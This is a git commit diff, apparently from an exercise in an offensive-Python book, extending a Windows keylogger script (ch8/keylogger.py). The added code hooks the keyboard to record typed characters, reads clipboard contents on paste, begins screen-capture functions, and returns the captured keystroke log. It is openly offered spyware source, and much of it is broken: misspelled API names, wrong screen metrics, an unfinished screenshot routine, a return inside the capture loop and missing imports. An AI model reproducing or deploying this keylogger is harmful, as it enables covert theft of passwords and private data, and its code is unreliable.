660d4ba9bcaa762e24c8ace5008c76a6e7f0828a
aleksa <zabumaphu@gmail.com>
2023-06-01 18:32:22 -0400

    Finished.

--- ch8/keylogger.py
+++ ch8/keylogger.py
@@ -13,6 +13,11 @@ import pyWinhook as pyHook
 import sys
 import time
 import win32clipboard
+import base64
+import win32api
+import win32con
+import win32gui
+import win32ui
 
 TIMEOUT = 60*10
 
@@ -20,7 +25,7 @@ class KeyLogger:
     def __init__(self):
         self.current_window = None
 
-    def get_currewnt_process(self):
+    def get_current_process(self):
         hwnd = windll.user32.GetForegroundWindow()
         pid = c_ulong(0)
         windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
@@ -39,3 +44,53 @@ class KeyLogger:
         print('\n', process_id, executable.value.decode(), self.current_window)
         windll.kernell32.CloseHandel(hwnd)
         windll.kernell32.CloseHandel(h_process)
+
+    def mykeystroke(self, event):
+        if event.WindowName != self.current_window:
+            self.get_current_process()
+        if 32 < event.Ascii < 127:
+            print(chr(event.Ascii), end=" ")
+        else:
+            if event.Key == 'V':
+                win32clipboard.OpenClipboard()
+                value = win32clipboard.GetClipboardData()
+                win32clipboard.CloseClipboard()
+                print(f'{event.Key}')
+        return True
+    
+    def get_dimensions(self):
+        width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
+        height = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
+        left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
+        top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
+        return (width, height, left, top)
+
+    def screenshot(self, name='screenshot'):
+        hdesktop = win32gui.GetDesktopWindow()
+        width, height, left, top = self.get_dimensions()
+
+        desktop_dc = win32gui.GetDesktopWindow()
+        img_dc = win32gui.CreateDCFromHandle(desktop_dc)
+        mem_dc = img_dc.CreateCompatibleDC()
+
+        screenshot = win32ui.CreateBitmap()
+        screenshot.CreateCompatibleBitmap(img_dc, width, height)
+        mem_dc.SelectObject(screenshot)
+
+def run():
+    save_stdout = sys.stdout
+    sys.stdout = StringIO()
+
+    kl = KeyLogger()
+    hm = pyHook.HookManager()
+    hm.KeyDown = kl.mykeystroke
+    hm.HookKeyboard()
+    while time.thread_time() < TIMEOUT:
+        pythoncom.PumpWaitingMessages()
+        log = sys.stdout.getvalue()
+        sys.stdout = save_stdout
+        return log
+    
+if __name__ == '__main__':
+    print(run())
+    print('Done.')
